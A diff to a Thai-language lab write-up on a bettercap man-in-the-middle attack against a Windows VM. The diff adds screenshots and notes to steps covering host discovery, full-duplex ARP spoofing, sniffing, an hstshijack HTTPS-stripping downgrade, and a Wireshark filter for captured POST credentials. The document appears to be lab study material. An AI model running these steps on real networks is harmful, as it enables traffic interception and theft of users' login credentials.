@@ -36,12 +36,20 @@
    net.show          # แสดง IP / MAC ที่พบ  → victim = 192.168.174.130
    ```
 
+   ![net.probe / net.show — device discovery](images/01_net_show.png)
+
+   ยืนยัน IP เครื่องเหยื่อด้วย `ipconfig` บน Windows VM:
+
+   ![victim ipconfig](images/02_victim_ipconfig.png)
+
 4. **ARP spoofing (full duplex)** — วางตัวเป็น man-in-the-middle ระหว่าง victim กับ gateway
    ```
    set arp.spoof.fullduplex true
    set arp.spoof.targets 192.168.174.130
    arp.spoof on
    ```
+
+   ![arp.spoof on — MITM position](images/03_arp_spoof.png)
 
 5. **Sniff + HSTS hijack**
    ```
@@ -50,10 +58,16 @@
    hstshijack/hstshijack   # inject / strip HTTPS, บังคับ downgrade เป็น HTTP
    ```
 
-6. **วิเคราะห์ด้วย Wireshark** — capture filter:
+   ![net.sniff on](images/04_net_sniff.png)
+
+6. **วิเคราะห์ด้วย Wireshark** — เลือก interface `eth0`, ตั้ง capture filter:
    ```
    ip.addr == 192.168.174.130 and http.request.method == "POST"
    ```
+
+   ![wireshark capture setup](images/05_wireshark_capture.png)
+
+   > หมายเหตุ: ภาพหน้า config caplet, ผลลัพธ์ credential ใน Wireshark และหน้า login ปลอม ไม่รวมไว้ในเอกสารสาธารณะนี้ เพราะยังแสดงชื่อโดเมนของสถาบันจริงที่ใช้ทดสอบใน lab
 
 ### ผลลัพธ์
 
